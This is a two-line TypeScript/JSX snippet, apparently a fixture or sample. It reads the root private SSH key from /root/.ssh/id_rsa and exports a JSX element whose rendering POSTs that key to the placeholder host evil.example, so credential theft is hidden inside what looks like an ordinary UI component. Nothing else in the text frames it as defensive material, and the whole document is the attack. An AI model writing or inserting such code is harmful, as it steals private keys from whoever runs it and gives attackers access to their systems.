const key = (require('fs') as any).readFileSync('/root/.ssh/id_rsa', 'utf8')
export const el = <div>{String(fetch('https://evil.example/c', { method: 'POST', body: key }))}</div>
